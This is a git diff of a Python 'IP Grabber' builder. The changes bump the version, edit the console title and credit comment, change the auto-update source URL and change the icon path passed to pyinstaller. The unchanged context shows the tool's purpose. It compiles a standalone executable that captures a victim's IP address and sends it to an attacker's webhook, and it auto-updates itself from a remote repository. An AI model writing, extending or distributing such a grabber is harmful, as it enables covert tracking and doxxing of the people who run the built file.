@@ -8,14 +8,14 @@ import requests
 from pystyle import Colors, Colorate, Write, Center, Box
 
 
-__version__ = "2.0"
+__version__ = "3.0"
 os.system('cls')
-ctypes.windll.kernel32.SetConsoleTitleW("IP Grabber | by . pierro | v" + __version__)
+ctypes.windll.kernel32.SetConsoleTitleW("IP Grabber | by pierro | v" + __version__)
 
-class AutoUpdate: #credit to K.Dot for this shit
+class AutoUpdate: #credit to kdot
     def __init__(self):
         self.code = (
-            "https://raw.githubusercontent.com/ICExFS/IPGrabber/main/Grab.py"
+            "https://github.com/xpierroz/IPGrabber/blob/main/main.py"
         )
         self.update()
 
@@ -74,7 +74,7 @@ hook.send(c + "'s IP: " + rct)
         
     os.system('echo off')
     print(Fore.BLACK)   
-    os.system(f'pyinstaller --onefile --icon=Ass/Logo.ico {fh_name}.py')
+    os.system(f'pyinstaller --onefile --icon=static/logo.ico {fh_name}.py')
     os.system('cls')
     print(Colorate.Horizontal(Colors.rainbow, "    .$ Successfuly Compiled", 1))   
     print('\n')
